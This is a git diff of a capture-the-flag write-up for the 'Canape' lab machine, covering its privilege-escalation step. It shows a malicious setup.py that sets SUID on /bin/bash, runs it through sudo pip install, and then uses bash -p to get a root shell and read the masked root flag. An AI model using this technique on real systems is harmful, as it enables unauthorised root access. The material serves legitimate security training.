@@ -638,7 +638,7 @@ homer@canape:/tmp/Privesc$ whoami
 homer
 homer@canape:/tmp/Privesc$ cd
 homer@canape:~$ cat user.txt
-bece4a9c7bf0b7de80d881ab69c307cb
+bece4a9c7bf0b7de80d881ab69xxxxxx
 ```
 
 <br />
@@ -673,7 +673,7 @@ This is really `dangerous`, because when we `run` a pip install, `pip` start `se
 
 <br />
 
-`Malicious setup.py Content:`
+`Malicious setup.py:`
 
 <br />
 
@@ -684,5 +684,53 @@ import os
 
 os.system('chmod 4755 /bin/bash')
 ```
+
+<br />
+
+Once we have `created` this `file` and given it `execution privileges`, we run `pip install` as `root` in the same directory:
+
+<br />
+
+```bash
+homer@canape:/tmp/hola$ sudo /usr/bin/pip install .
+The directory '/home/homer/.cache/pip/http' or its parent directory is not owned by the current user and the cache has been disabled. Please check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.
+The directory '/home/homer/.cache/pip' or its parent directory is not owned by the current user and caching wheels has been disabled. check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.
+Processing /tmp/hola
+No files/directories in /tmp/pip-96XsqM-build/pip-egg-info (from PKG-INFO)
+```
+
+<br />
+
+Now, we `check` if the `command` was successfully `executed` listing the `/bin/bash` privileges:
+
+<br />
+
+```bash
+homer@canape:/tmp/hola$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1113504 Apr 18  2022 /bin/bash
+```
+
+<br />
+
+Perfect!! The `suid permission` has been successfully `added` to the `bash`, now we will simply have to `execute` it `according` to this `privilege` using the parameter `"-p"`:
+
+<br />
+
+```bash
+homer@canape:/tmp/hola$ bash -p
+bash-4.4# id
+uid=1000(homer) gid=1000(homer) euid=0(root) groups=1000(homer)
+bash-4.4# cd /root
+bash-4.4# cat root.txt
+670fd2ff4e259056a4f3971e66xxxxxx
+```
+
+<br />
+
+Canape Machine rooted!!!
+
+I hope that you had learned and ejoyed a lot.
+
+Keep hacking!!❤️❤️
 
 <br />
